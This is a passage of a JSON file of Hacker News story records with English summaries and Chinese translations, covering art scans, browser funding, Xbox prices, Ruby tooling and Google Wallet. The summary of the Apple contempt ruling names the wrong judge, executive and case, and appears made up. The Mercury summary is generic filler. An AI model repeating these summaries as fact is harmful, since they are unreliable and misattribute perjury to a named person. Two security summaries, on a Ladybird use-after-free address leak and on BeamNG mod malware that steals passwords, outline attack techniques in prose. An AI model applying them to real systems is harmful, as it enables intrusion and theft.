    "chinese_summary": "本文概述了管理“臭鼬工厂”项目的关键原则——即大型公司内部负责构建新系统的小型创新团队。作者借鉴了领导Meta的Delos项目和Confluent的新Kafka引擎等两个此类项目的经验，强调了由于激励结构经常与全新创新相冲突而产生的管理挑战。\n\n核心原则包括：**A) 亲力亲为的架构师：**设计师必须编码。**B) 共同所有权：**每个人都作为团队承担责任并获得奖励。**C) 基于优势的工作：**关注个人优势，而不是弱点。**D) 精准沟通：**正式文档应高质量且量身定制。**E) 协同设计：**避免扼杀参与的“先写文档者胜”的文化。**F) 基于影响的奖励：**晋升与产品交付挂钩。**G) 最小化依赖性：**控制质量并避免延误。**H) 了解项目需求：**尽早优先考虑基础要素。**I) 优先考虑“猪”而非“鸡”：**偏爱投入的、全职的工程师。**J) 消除不必要的流程。**K) 逐步超负荷团队：**迫使无情的优先级排序和创造性的解决方案。**L) 延迟退出臭鼬工厂模式：**保持创新文化，直到取得可证实的成功。**M) 拥抱快速失败：**建立具体的成功标准并快速迭代。**N) 以研发为目标：**在创新与实际应用之间取得平衡。**O) 同步沟通：**促进共同理解和协作。**P) 团队构成至关重要：**为特定角色选择人员。**Q) 迎向风险：**解决最具挑战性的领域。**R) 保持团队规模小：**维持资源约束并防止成本削减。\n\n最终，作者强调在更大的组织内部创造独特的文化，培养团队合作、敏捷性以及对有影响力的成果的关注。"
  },
  {
    "id": "43852266",
    "title": "108B Pixel Scan of Johannes Vermeer's Girl with a Pearl Earring",
    "url": "https://www.hirox-europe.com/gigapixel/girl-with-a-pearl-earring/",
    "summary": "This article announces the creation of a 108-gigapixel scan of Johannes Vermeer's famous painting, \"Girl with a Pearl Earring,\" located at the Mauritshuis museum. The scanning was performed by Hirox, allowing for unprecedented detail and clarity of the artwork to be viewed. The exceptionally high resolution allows viewers to zoom in and observe minuscule details that are typically invisible to the naked eye, even when viewing the painting in person. The title emphasizes the enormous size of the scan, highlighting its advanced technological achievement and significant contribution to art preservation and appreciation.\n",
    "chinese_title": "戴珍珠耳环的少女 1080亿像素扫描图",
    "chinese_summary": "本文宣布已完成对莫瑞泰斯皇家美术馆收藏的约翰内斯·维米尔名画《戴珍珠耳环的少女》的1080亿像素扫描。此次扫描由Hirox公司完成，使人们能够以前所未有的细节和清晰度欣赏这幅艺术作品。 如此超高分辨率使得观看者可以放大并观察通常肉眼无法看到的微小细节，即使是在亲眼观看这幅画作时也难以发现。 标题强调了扫描图像的巨大尺寸，突出了其先进的技术成就以及对艺术品保护和鉴赏的重大贡献。"
  },
  {
    "id": "43851225",
    "title": "Home washing machines fail to remove important pathogens from textiles",
    "url": "https://medicalxpress.com/news/2025-04-home-machines-important-pathogens-textiles.html",
    "summary": "This article, published in PLOS One and led by Katie Laird of De Montfort University, highlights the ineffectiveness of home washing machines in removing dangerous pathogens from healthcare worker uniforms. The study found that standard home washing machines often fail to adequately disinfect textiles, potentially contributing to the spread of antibiotic-resistant hospital-acquired infections.\n\nResearchers evaluated six home washing machine models and found that half failed to disinfect clothing on a rapid cycle, and a third failed on a standard cycle using hot water. Sampling of biofilms inside washing machines revealed the presence of potentially pathogenic bacteria and antibiotic resistance genes. Furthermore, bacteria can develop resistance to domestic detergents, which also increases resistance to certain antibiotics.\n\nThe findings suggest a need to revise laundering guidelines for healthcare workers. The researchers propose exploring alternative solutions, such as on-site industrial laundering facilities in healthcare settings, to ensure effective disinfection of uniforms and improve patient safety by controlling the spread of antibiotic-resistant pathogens. The authors emphasize the need to rethink laundering practices to address the transmission of infectious diseases via textiles and combat antimicrobial resistance.\n",
    "chinese_title": "家用洗衣机无法有效去除纺织品上的重要病原体",
    "chinese_summary": "PLOS One发表的，由德蒙福特大学的凯蒂·莱尔德主导的这篇文章强调了家用洗衣机在去除医护人员制服上的危险病原体方面的无效性。研究发现，标准的家用洗衣机通常无法充分消毒纺织品，可能导致耐抗生素医院获得性感染的传播。\n\n研究人员评估了六款家用洗衣机型号，发现一半的洗衣机无法在快洗模式下对衣物进行消毒，三分之一的洗衣机在使用热水的标准模式下也无法做到。对洗衣机内部生物膜的采样显示，存在潜在的致病细菌和抗生素耐药基因。此外，细菌会对家用洗涤剂产生耐药性，这也增加了对某些抗生素的耐药性。\n\n研究结果表明，有必要修订医护人员的洗涤指南。研究人员建议探索替代解决方案，例如在医疗机构内设置现场工业洗衣设施，以确保有效消毒制服，并通过控制耐抗生素病原体的传播来提高患者安全。作者强调，需要重新思考洗涤方式，以解决通过纺织品传播传染病和对抗抗菌素耐药性的问题。"
  },
  {
    "id": "43827054",
    "title": "All four major web browsers are about to lose 80% of their funding",
    "url": "https://danfabulich.medium.com/all-four-major-web-browsers-are-about-to-lose-80-of-their-funding-0e42ceb358f1",
    "summary": "This article argues that the US Department of Justice's antitrust case against Google could have unintended and devastating consequences for the web browser market. Currently, Google significantly funds the development of all four major web browsers: Chrome, Edge, Firefox, and Safari.\n\nGoogle directly pays Mozilla (approximately $450 million annually) and Apple (around $18 billion annually) to make Google Search the default search engine in Firefox and Safari, respectively. For Mozilla, these payments constitute over 80% of their revenue. While Apple's specific Safari budget is undisclosed, Google's payments represent a substantial portion of Apple's overall R&D budget.\n\nMicrosoft Edge is based on Chromium, the open-source version of Chrome. While Microsoft contributes code back to Chromium, Google's contributions account for roughly 94% of the total.\n\nThe DoJ's case aims to prevent Google from making these search-engine deals and force them to divest from Chrome. This would effectively cut off the funding streams for Mozilla, Apple, and significantly reduce the development of Chromium, thereby impacting Edge. The author argues that while intended to foster competition and punish Google for anticompetitive behavior, this action will inadvertently cripple the development of all major web browsers, destabilizing a foundational tool for internet access. The author sees the DoJ action as likely to succeed, leading to significant troubles for the web browser ecosystem.\n",
    "chinese_title": "所有四大网络浏览器即将失去 80% 的资金。",
    "chinese_summary": "本文认为，美国司法部对谷歌的反垄断诉讼可能会对网络浏览器市场产生意想不到且具有破坏性的后果。目前，谷歌为所有四款主要网络浏览器的开发提供了大量资金：Chrome、Edge、Firefox 和 Safari。\n\n谷歌直接支付给 Mozilla（每年约 4.5 亿美元）和苹果（每年约 180 亿美元），以使 Google 搜索分别成为 Firefox 和 Safari 的默认搜索引擎。对于 Mozilla 而言，这些付款占其收入的 80% 以上。虽然苹果的 Safari 具体预算未公开，但谷歌的付款在苹果的整体研发预算中占很大一部分。\n\nMicrosoft Edge 基于 Chromium，即 Chrome 的开源版本。虽然微软将代码贡献回 Chromium，但谷歌的贡献约占总量的 94%。\n\n司法部的案件旨在阻止谷歌达成这些搜索引擎协议，并迫使其剥离 Chrome。这将有效地切断 Mozilla 和 Apple 的资金来源，并显著减少 Chromium 的开发，从而影响 Edge。作者认为，虽然此举旨在促进竞争并惩罚谷歌的反竞争行为，但它将无意中削弱所有主要网络浏览器的开发，从而破坏互联网访问的基础工具。作者认为，司法部的行动很可能成功，从而给网络浏览器生态系统带来重大麻烦。"
  },
  {
    "id": "43868463",
    "title": "Microsoft Announces Xbox Console Price Hike, Xbox Games to Cost $80",
    "url": "https://kotaku.com/microsoft-xbox-series-x-s-price-increase-may-2025-1851778615",
    "summary": "Microsoft is raising the prices of Xbox consoles, accessories, and first-party games, with increases taking effect immediately for hardware and by the holidays for games. The Xbox Series S 512GB will jump to $379.99 (a 27% increase), and the Xbox Series X will rise to $599.99 (a 20% increase). The Xbox Series X 2TB Galaxy edition will now cost $730.\n\nAccessory prices are also increasing, with the standard Xbox controller going to $65 and the Elite Series 2 controller to $150. Microsoft attributes the increases to market conditions and rising development costs, although Trump's tariffs are suggested as a contributing factor, particularly impacting the U.S. market.\n\nFirst-party games will cost $80 by the holiday season, matching Nintendo's pricing. This means upcoming titles like Call of Duty will likely be affected. While Game Pass offers access to these games, the subscription price has also increased. Sony recently increased its console prices, signaling a trend of rising costs across the gaming industry, exacerbated by the Switch 2 high prices.\n",
    "chinese_title": "微软宣布Xbox游戏机涨价，Xbox游戏价格将达80美元",
    "chinese_summary": "微软上调Xbox主机、配件和第一方游戏价格，硬件价格即刻生效，游戏价格假期生效。Xbox Series S 512GB将涨至379.99美元（上涨27%），Xbox Series X将涨至599.99美元（上涨20%）。Xbox Series X 2TB星河版现价730美元。\n\n配件价格也在上涨，标准Xbox手柄将涨至65美元，精英手柄2代将涨至150美元。微软将涨价归因于市场状况和不断上涨的开发成本，尽管特朗普的关税也被认为是影响因素，尤其影响美国市场。\n\n第一方游戏价格将在假期季涨至80美元，与任天堂定价持平。这意味着即将推出的《使命召唤》等游戏可能会受到影响。虽然Game Pass提供这些游戏的访问权限，但订阅价格也上涨了。索尼最近提高了其主机价格，预示着游戏行业成本上涨的趋势，而Switch 2的高价格加剧了这一趋势。"
  },
  {
    "id": "43856795",
    "title": "Judge rules Apple executive lied under oath, makes criminal contempt referral",
    "url": "https://www.thebignewsletter.com/p/judge-rules-apple-executive-lied",
    "summary": "Here's a summary of the article \"Judge rules Apple executive lied under oath, makes criminal contempt referral\" from the provided URL:\n\nThe article details a ruling by U.S. Magistrate Judge Thomas Hixson in a discovery dispute between Apple and a company called Optis Wireless Technology, which is suing Apple over patents related to 4G LTE technology. Judge Hixson found that Tony Blevins, an Apple executive, lied under oath about his role in Apple's negotiations with Qualcomm regarding cellular modem technology.\n\nSpecifically, the judge determined that Blevins knowingly misled the court about the existence and handling of a specific memo regarding Qualcomm's alleged refusal to license key patents to Apple's chip suppliers. The judge concluded that Blevins attempted to downplay the importance of the memo and his involvement in its handling, which was deemed untruthful.\n\nAs a result of this finding, Judge Hixson has referred Blevins to the U.S. Attorney's Office for potential criminal contempt proceedings. This means the U.S. Attorney will consider whether to pursue criminal charges against Blevins for lying under oath. The judge emphasized the importance of truthful testimony in legal proceedings and the seriousness of perjury. The case highlights the ongoing legal battles between Apple and companies asserting patent infringement, as well as the potential consequences of dishonest conduct during legal proceedings.\n",
    "chinese_title": "法官裁定苹果高管作伪证，移交刑事藐视法庭处理。",
    "chinese_summary": "以下是文章“法官裁定苹果高管在宣誓后撒谎，并建议以刑事藐视罪起诉”的摘要，该文章来自提供的URL：\n\n该文章详细描述了美国地方法官托马斯·希克森在一项苹果公司与Optis Wireless Technology公司之间的证据开示纠纷中做出的裁决。Optis Wireless Technology公司正在起诉苹果公司，指控其侵犯与4G LTE技术相关的专利。希克森法官认定，苹果公司高管托尼·布莱文斯在宣誓后就其在苹果公司与高通公司就蜂窝调制解调器技术进行的谈判中所扮演的角色撒了谎。\n\n具体而言，法官认定布莱文斯明知地就一份关于高通公司涉嫌拒绝向苹果公司的芯片供应商授予关键专利许可的特定备忘录的存在和处理方式误导了法庭。法官的结论是，布莱文斯试图淡化该备忘录的重要性以及他参与处理该备忘录的程度，这被认为是虚假的。\n\n由于这一发现，希克森法官已将布莱文斯移交给美国检察官办公室，以进行潜在的刑事藐视诉讼。这意味着美国检察官将考虑是否对布莱文斯提起因宣誓后撒谎的刑事指控。法官强调了在法律诉讼中如实作证的重要性以及伪证的严重性。该案件凸显了苹果公司与声称专利侵权的公司之间持续不断的法律斗争，以及在法律诉讼中不诚实行为的潜在后果。"
  },
  {
    "id": "43850309",
    "title": "Creating beautiful charts with JRuby and JFreeChart",
    "url": "https://blog.headius.com/2025/04/beautiful-charts-with-jruby-and-jfreechart.html",
    "summary": "This article promotes JRuby as a superior alternative for creating charts in Ruby compared to using libraries that wrap C, Python, or JavaScript. It highlights the seamless Java integration within JRuby, allowing developers to leverage JVM-based libraries without writing Java code.\n\nThe author uses JFreeChart as an example, demonstrating how to fetch the library using `jar-dependencies` and then use it to generate both bar charts and pie charts directly from Ruby code. The process involves loading the library, creating datasets, configuring chart options, and outputting the chart as an image file. The examples demonstrate how JRuby simplifies the process by treating Java classes like Ruby classes, converting Java getter/setter methods to Ruby attribute accessors, and even allowing Ruby File objects to be used as Java OutputStreams.\n\nThe article emphasizes the benefits of this approach: avoiding complex bindings to other languages, running everything within the same JVM process, and deploying easily to any system with a JDK. The author encourages readers to explore other Java libraries for tasks like PDF generation or database integration, and also promotes JRuby's Warbler for creating single-file deployments. Finally, it includes a call to action to support JRuby development through sponsorships or commercial support contracts.\n",
    "chinese_title": "使用JRuby和JFreeChart创建精美图表",
    "chinese_summary": "本文推崇JRuby作为Ruby中创建图表的更优选择，优于那些封装C、Python或JavaScript的库。它强调了JRuby中无缝的Java集成，允许开发者在不编写Java代码的情况下利用基于JVM的库。\n\n作者以JFreeChart为例，展示了如何使用`jar-dependencies`获取该库，并直接从Ruby代码中生成条形图和饼图。该过程涉及加载库、创建数据集、配置图表选项以及将图表输出为图像文件。这些示例展示了JRuby如何简化该过程：将Java类视为Ruby类，将Java getter/setter方法转换为Ruby属性访问器，甚至允许将Ruby File对象用作Java OutputStream。\n\n文章强调了这种方法的优势：避免与其他语言的复杂绑定，在同一JVM进程中运行一切，以及轻松部署到任何安装了JDK的系统。作者鼓励读者探索其他Java库，用于诸如PDF生成或数据库集成之类的任务，并推广JRuby的Warbler以创建单文件部署。最后，文章号召通过赞助或商业支持合同来支持JRuby的开发。"
  },
  {
    "id": "43864752",
    "title": "Fast(er) regular expression engines in Ruby",
    "url": "https://serpapi.com/blog/faster-regular-expression-engines-in-ruby/",
    "summary": "This article benchmarks the performance of different regular expression engines in Ruby, focusing on alternatives to the default Onigmo engine. The author, from SerpApi, highlights the increasing reliance on regex for data extraction from complex websites and the potential performance bottlenecks of Onigmo.\n\nThe study compares Onigmo with Google's `re2` and Rust's `rust/regex`, using variations of the rebar benchmark suite on an Ubuntu server.  The benchmarks cover various scenarios, including literal matching, alternations, date extraction, ReDoS vulnerability, word finding, and bounded repeats, with both English and Unicode (Cyrillic, Chinese) haystacks.\n\n`rust/regex` generally emerges as the fastest across most tests.  `re2` demonstrates good performance with ASCII text and protection against ReDoS attacks, but significantly slows down with Unicode characters. Ruby's Onigmo performs reasonably well in simple scenarios but struggles with case-insensitive matching, alternations, and complex regexes.  Specifically, Ruby exhibits poor performance when dealing with case-insensitivity and alternation and is generally outperformed by the other engines, especially on complex patterns. Re2 also shows limitations with Unicode, often performing worse than Ruby in such cases. The author provides code and benchmark scripts on GitHub.\n",
    "chinese_title": "Ruby 中更快的正则表达式引擎",
    "chinese_summary": "本文对Ruby中不同正则表达式引擎的性能进行了基准测试，重点关注默认Onigmo引擎的替代方案。SerpApi的作者强调，从复杂网站提取数据时越来越依赖正则表达式，以及Onigmo潜在的性能瓶颈。\n\n该研究在Ubuntu服务器上使用rebar基准测试套件的变体，比较了Onigmo与谷歌的`re2`和Rust的`rust/regex`。基准测试涵盖各种场景，包括字面匹配、交替、日期提取、ReDoS漏洞、单词查找和有界重复，使用了英语和Unicode（西里尔文、中文）的文本。\n\n`rust/regex`通常在大多数测试中表现最快。`re2`在ASCII文本上表现出良好的性能，并能防止ReDoS攻击，但在处理Unicode字符时速度会显著下降。Ruby的Onigmo在简单场景中表现尚可，但在大小写不敏感匹配、交替和复杂正则表达式方面表现不佳。具体来说，Ruby在处理大小写不敏感和交替时表现较差，并且通常被其他引擎超越，尤其是在复杂模式上。Re2在Unicode方面也表现出局限性，在这些情况下通常比Ruby表现更差。作者在GitHub上提供了代码和基准测试脚本。"
  },
  {
    "id": "43856803",
    "title": "International Workers' Day",
    "url": "https://en.wikipedia.org/wiki/International_Workers%27_Day",
    "summary": "International Workers' Day, also known as Labour Day or May Day, is an annual celebration of laborers and the working classes observed on May 1st (or the first Monday in May). It originated from the labor movement's struggle for an eight-hour workday. The date commemorates the 1886 Haymarket affair in Chicago, a culmination of a general strike that began on May 1st.\n\nThe Second International, established in 1889, formally recognized May 1st as a day for international demonstrations in support of working-class demands. Many countries now recognize it as a public holiday, often called \"International Workers' Day,\" while some, like the United States and Canada, celebrate Labour Day on different dates, typically in September.\n\nHistorically, socialist, communist, and anarchist groups have used International Workers' Day for demonstrations. In communist countries, it was a major holiday featuring workforce parades and displays of military strength. In 1955, the Catholic Church dedicated May 1st to \"Saint Joseph the Worker.\"\n\nToday, the majority of countries worldwide observe a workers' day on May 1st with varying customs, ranging from parades and rallies to government announcements regarding wage increases and labor improvements. The celebration of workers' rights and contributions remains central to the holiday.\n",
    "chinese_title": "国际劳动节",
    "chinese_summary": "国际劳动节，又称劳动节或五一节，是每年庆祝劳动者和工人阶级的节日，于5月1日（或5月的第一个星期一）举行。它起源于劳工运动争取八小时工作制的斗争。该日期是为了纪念1886年芝加哥的干草市场事件，这是一场始于5月1日的大罢工的高潮。\n\n1889年成立的第二国际正式将5月1日定为支持工人阶级要求的国际示威日。许多国家现在承认它为公共假日，通常称为“国际劳动节”，而美国和加拿大等一些国家则在不同的日期庆祝劳动节，通常在9月。\n\n历史上，社会主义、共产主义和无政府主义团体曾利用国际劳动节进行示威活动。在共产主义国家，这是一个重要的节日，有劳动力游行和军事力量展示。1955年，天主教会将5月1日奉献给“圣约瑟夫劳动者”。\n\n今天，世界上大多数国家都在5月1日庆祝劳动节，习俗各异，从游行和集会到政府宣布工资增长和劳动改善措施。庆祝工人权利和贡献仍然是这个节日的中心。"
  },
  {
    "id": "43863937",
    "title": "Deno's Decline",
    "url": "https://dbushell.com/2025/04/28/denos-decline/",
    "summary": "This article, titled \"Deno's Decline,\" outlines the author's disappointment and growing concern regarding the state of Deno Land Inc. and its products, particularly Deno Deploy. The core argument is that Deno Deploy's \"edge\" hosting is failing to deliver on its promises, evidenced by a dramatic reduction in global regions from 35 to just 6 between January 2024 and January 2025. This reduction has significantly impacted latency and performance for users in affected regions.\n\nThe author contrasts Deno Deploy's diminished reach with competitors like Cloudflare and Bunny, questioning Deno's definition of \"serverless.\" Concerns extend beyond Deno Deploy, with the author highlighting the stagnation of Deno's Fresh web framework and the apparent abandonment of Deno KV. They also criticize JSR's packaging system. The author views Deno's runtime releases as primarily focused on Node.js compatibility, lacking innovation.\n\nThe author expresses personal frustration, admitting to initially investing heavily in Deno and feeling \"rug pulled\" by its current trajectory. Despite this, they express interest in Bun as a potential alternative and demonstrate a renewed interest in the space. The article concludes with a note about a new combined RSS feed. The author questions whether Deno's claims of \"global scale\" and \"edge hosting\" could be considered false advertising.\n",
    "chinese_title": "Deno的衰落",
    "chinese_summary": "Deno的衰落：作者对Deno Land Inc.及其产品（尤其是Deno Deploy）现状的失望和日益增长的担忧。核心论点是，Deno Deploy的“边缘”托管未能兑现承诺，表现为2024年1月至2025年1月期间，全球区域从35个大幅减少到仅剩6个。这种减少严重影响了受影响地区用户的延迟和性能。\n\n作者将Deno Deploy的缩减与Cloudflare和Bunny等竞争对手进行对比，质疑Deno对“无服务器”的定义。担忧不仅限于Deno Deploy，作者还强调了Deno的Fresh Web框架的停滞以及Deno KV的明显放弃。他们还批评了JSR的包管理系统。作者认为Deno的运行时版本主要侧重于Node.js的兼容性，缺乏创新。\n\n作者表达了个人沮丧，承认最初对Deno投入巨大，并因其目前的轨迹而感到“被割韭菜”。尽管如此，他们表示对Bun作为潜在替代方案的兴趣，并表现出对该领域重新燃起的兴趣。文章最后提到了一个新的组合RSS订阅源。作者质疑Deno声称的“全球规模”和“边缘托管”是否可以被认为是虚假广告。"
  },
  {
    "id": "43865479",
    "title": "Show HN: Maybe – The personal finance app for everyone",
    "url": "https://maybefinance.com/",
    "summary": "Maybe is a personal finance application designed to be an all-in-one platform. It aims to help users track, optimize, grow, and manage their money throughout different life stages. The platform offers a free trial and also provides the option for users to self-host the application. The post also shows the product has garnered significant traction, evidenced by 43.8k views and 5.4k upvotes.\n",
    "chinese_title": "展示HN：Maybe – 适用于所有人的个人理财应用",
    "chinese_summary": "也许是一款旨在成为一体化平台的个人理财应用。它旨在帮助用户在不同的人生阶段跟踪、优化、增长和管理他们的资金。该平台提供免费试用，并允许用户自行托管该应用程序。该帖子还显示该产品获得了显著关注，拥有 4.38 万次浏览和 5.4 千个赞。"
  },
  {
    "id": "43859165",
    "title": "Show HN: Robot Unlock – an open-ended programming game/zachlike",
    "url": "https://store.steampowered.com/app/3318050/Robot_Unlock/",
    "summary": "The \"Show HN\" post introduces \"Robot Unlock,\" described as an open-ended programming game and a \"zachlike\" game. This suggests a game with puzzle-solving elements focusing on programming, automation, and optimization, similar to games created by Zachtronics Industries (like SpaceChem or Opus Magnum).\n\nThe rest of the text is navigational and informational elements from a Steam page, indicating that the game is likely available on Steam. It includes options to navigate to different sections of the store (Home, Discovery Queue, Wishlist, Points Shop, News, Statistics, Community) and also account-related options (Install Steam, Login). Critically, it lists the supported languages, including many European and Asian languages, signifying a broad target audience.\n",
    "chinese_title": "展示HN：机器人解锁 – 一个开放式编程游戏/zachlike",
    "chinese_summary": "“Show HN”帖子介绍了“Robot Unlock”，称其为一款开放式编程游戏和“zachlike”游戏。这表明该游戏具有解谜元素，侧重于编程、自动化和优化，类似于Zachtronics Industries开发的游戏（如SpaceChem或Opus Magnum）。\n\n其余文本是来自Steam页面的导航和信息元素，表明该游戏可能在Steam上可用。它包括导航到商店不同部分的选项（首页、探索队列、愿望单、积分商店、新闻、统计、社区），以及与帐户相关的选项（安装Steam、登录）。关键是，它列出了支持的语言，包括许多欧洲和亚洲语言，表明其目标受众广泛。"
  },
  {
    "id": "43852096",
    "title": "Pwning the Ladybird Browser",
    "url": "https://jessie.cafe/posts/pwning-ladybirds-libjs/",
    "summary": "This article details a vulnerability found in the Ladybird browser's JavaScript engine, LibJS. The author used the Fuzzilli fuzzer to discover ten unique crashes, eventually focusing on a use-after-free (UAF) vulnerability in the interpreter's argument buffer.\n\nThe UAF occurs when a proxied function object is used as a constructor with a malicious `[[Get]]` handler. The `[[Get]]` handler, triggered during the process of creating a new object with the constructor's prototype, reallocates the argument buffer, freeing the memory that `arguments_list` still points to. Subsequently, when the code attempts to access the arguments for the function call, it accesses freed memory, resulting in a UAF.\n\nThe author provides a code example demonstrating the vulnerability, triggering a crash in Ladybird. The fix implemented involves performing the prototype `[[Get]]` strictly after the callee context has been constructed.\n\nFurthermore, the article outlines a method for exploiting the UAF to leak the address of an object. By carefully allocating memory within the freed argument buffer, the attacker can introduce a pointer to a target object. This pointer can then be read from the `arguments` object within the constructor, effectively leaking the object's address. The use of `FinalizationRegistry` plays a crucial role in placing the object pointer within the freed memory region.\n",
    "chinese_title": "入侵瓢虫浏览器",
    "chinese_summary": "本文详细介绍了一个在Ladybird浏览器JavaScript引擎LibJS中发现的漏洞。作者使用Fuzzilli模糊测试器发现了十个独特的崩溃，最终专注于解释器参数缓冲区中的一个释放后使用（UAF）漏洞。\n\n当代理函数对象被用作构造函数，并带有恶意的`[[Get]]`处理程序时，会发生UAF。`[[Get]]`处理程序在用构造函数的原型创建新对象时触发，它会重新分配参数缓冲区，释放`arguments_list`仍然指向的内存。随后，当代码尝试访问函数调用的参数时，它会访问已释放的内存，从而导致UAF。\n\n作者提供了一个代码示例，演示了该漏洞，并在Ladybird中触发了崩溃。实施的修复方法包括严格在构造函数上下文构建之后执行原型`[[Get]]`。\n\n此外，本文概述了一种利用UAF来泄漏对象地址的方法。通过在释放的参数缓冲区中仔细分配内存，攻击者可以引入指向目标对象的指针。然后可以从构造函数中的`arguments`对象中读取该指针，从而有效地泄漏对象的地址。`FinalizationRegistry`在将对象指针放置在释放的内存区域中起着至关重要的作用。"
  },
  {
    "id": "43849536",
    "title": "I Found Malware in a BeamNG Mod",
    "url": "https://lemonyte.com/blog/beamng-malware",
    "summary": "This article details the discovery and analysis of malware found in a BeamNG.drive game mod called \"American Road.\" The author noticed suspicious network activity originating from the game, specifically the execution of `curl.exe` attempting to access a malicious domain.\n\nUsing Process Monitor and WinDbg, the author traced the activity to the in-game mod manager and eventually pinpointed the \"American Road\" mod as the source. The malware was hidden within a seemingly innocuous JavaScript file (`american_road_patreon_banner.js`) responsible for displaying a Patreon banner.\n\nThe script employed multiple layers of obfuscation, including XOR encryption and the dynamic creation of functions using the `Function` constructor, effectively creating an `eval`-like execution. The deobfuscated code exploited CVE-2019-5825, a vulnerability in the Chromium Embedded Framework (CEF) used by BeamNG.drive for UI rendering. This allowed the injection and execution of shellcode into memory.\n\nThe shellcode downloaded and executed a DLL file. The DLL proved to be an infostealer, designed to steal passwords from browsers and the Exodus crypto wallet.\n\nThe author reported the findings to the BeamNG team, leading to the removal of the compromised mod and suspension of the author's account. While over 3,500 users downloaded the infected mod, the author notes that BeamNG updated their CEF version soon after the mod was published, and this update would prevent the V8 exploit from working. It is also noted that BeamNG uses the --no-sandbox flag for its subprocesses, which could further enable exploitation.\n",
    "chinese_title": "我在BeamNG模组里发现了恶意软件",
    "chinese_summary": "本文详细介绍了在 BeamNG.drive 游戏模组 \"American Road\" 中发现并分析恶意软件的过程。作者注意到游戏产生可疑的网络活动，特别是 `curl.exe` 试图访问恶意域名。\n\n通过使用 Process Monitor 和 WinDbg，作者将该活动追踪到游戏内的模组管理器，最终确定 \"American Road\" 模组为源头。该恶意软件隐藏在一个看似无害的 JavaScript 文件 (`american_road_patreon_banner.js`) 中，该文件负责显示 Patreon 横幅。\n\n该脚本采用了多层混淆，包括 XOR 加密和使用 `Function` 构造函数动态创建函数，有效地创建了一个类似 `eval` 的执行环境。解混淆后的代码利用了 CVE-2019-5825，这是 BeamNG.drive 用于 UI 渲染的 Chromium Embedded Framework (CEF) 中的一个漏洞。这允许将 shellcode 注入并执行到内存中。\n\n该 shellcode 下载并执行了一个 DLL 文件。该 DLL 被证实是一个信息窃取器，旨在从浏览器和 Exodus 加密钱包中窃取密码。\n\n作者将调查结果报告给了 BeamNG 团队，导致该受感染模组被移除，并且作者的帐户被暂停。虽然超过 3500 名用户下载了该受感染模组，但作者指出，BeamNG 在该模组发布后不久更新了他们的 CEF 版本，此更新将阻止 V8 漏洞利用。 此外，还注意到 BeamNG 对其子进程使用了 --no-sandbox 标志，这可能会进一步促进利用。"
  },
  {
    "id": "43851099",
    "title": "Mercury: Commercial-scale diffusion language model",
    "url": "https://www.inceptionlabs.ai/introducing-mercury",
    "summary": "**Summary of \"Mercury: Commercial-scale diffusion language model\" based on provided URL:**\n\nInception Labs has announced Mercury, a new commercial-scale diffusion language model designed for high-quality text generation, editing, and conditional text generation. The announcement highlights Mercury's capabilities in generating diverse and realistic content, making it suitable for various applications across industries.\n\nKey features and benefits of Mercury include:\n\n*   **High-Quality Text Generation:** Mercury aims to produce text that is both coherent and contextually relevant, surpassing existing models in certain aspects.\n*   **Text Editing:** The model supports precise text manipulation, allowing users to refine and enhance existing content.\n*   **Conditional Text Generation:** Mercury enables the generation of text based on specific prompts, instructions, or conditions, offering greater control over the output.\n*   **Commercial Application:** Built for real-world use cases, Mercury is designed to be reliable, scalable, and adaptable to diverse business needs.\n*   **Potential Use Cases:** The announcement hints at applications in content creation, marketing, customer service, and other domains.\n\nIn essence, Mercury is positioned as a powerful new tool for businesses seeking to leverage the capabilities of diffusion models for a wide range of text-based tasks. The announcement emphasizes its ability to generate high-quality, controllable content, making it a competitive option in the evolving landscape of language models.\n",
    "chinese_title": "水星：商用级扩散模型",
    "chinese_summary": "基于所提供URL的“墨丘利：商业级扩散语言模型”摘要：\n\nInception Labs发布了墨丘利（Mercury），一种新的商业级扩散语言模型，专为高质量的文本生成、编辑和条件文本生成而设计。该公告强调了墨丘利在生成多样化和逼真内容方面的能力，使其适用于各行业的各种应用。\n\n墨丘利的主要特性和优势包括：\n\n*   **高质量文本生成：** 墨丘利旨在生成连贯且与上下文相关的文本，在某些方面超越了现有模型。\n*   **文本编辑：** 该模型支持精确的文本操作，允许用户改进和增强现有内容。\n*   **条件文本生成：** 墨丘利能够根据特定的提示、指令或条件生成文本，从而更好地控制输出。\n*   **商业应用：** 墨丘利专为实际应用而构建，旨在可靠、可扩展并适应各种业务需求。\n*   **潜在用例：** 该公告暗示了其在内容创作、营销、客户服务和其他领域的应用。\n\n本质上，墨丘利被定位为企业寻求利用扩散模型能力来处理各种基于文本的任务的强大新工具。该公告强调了其生成高质量、可控内容的能力，使其在不断发展的语言模型领域中成为一个有竞争力的选择。"
  },
  {
    "id": "43863672",
    "title": "Google Wallet launches new age and identity verification features (ZK proofs)",
    "url": "https://blog.google/products/google-pay/google-wallet-age-identity-verifications/",
    "summary": "Google Wallet is introducing new features to securely verify age and identity, leveraging Zero-Knowledge Proof (ZKP) technology for enhanced privacy. Residents in the U.K. will soon be able to store digital ID passes from their passports in Google Wallet, starting with verification for Railcards. The U.K. is also exploring expanding the use of these ID passes for purchases like alcohol through its digital identity trust framework.\n\nIn the U.S., Arkansas, Montana, Puerto Rico, and West Virginia will soon support saving government-issued digital IDs to Google Wallet, while Arizona, Georgia, Maryland, and New Mexico will allow mobile ID use at the DMV. U.S. passport-based ID passes can be used at TSA security for domestic travel, even without a REAL ID.\n\nNew partnerships will enable digital ID use for Amazon account recovery, accessing online health services with CVS Health and MyChart by Epic, and verifying profiles on platforms like Uber. The integration of ZKP technology allows for fast and private age verification without revealing personal information, and this technology will be open-sourced to other wallets and services.\n\nGoogle Wallet is also expanding to 50 more countries, enabling users to view and use digital passes even where tap-to-pay functionality isn't available. This global expansion broadens the reach of Google Wallet's security and convenience features.\n",
    "chinese_title": "Google钱包推出全新年龄和身份验证功能（零知识证明）",
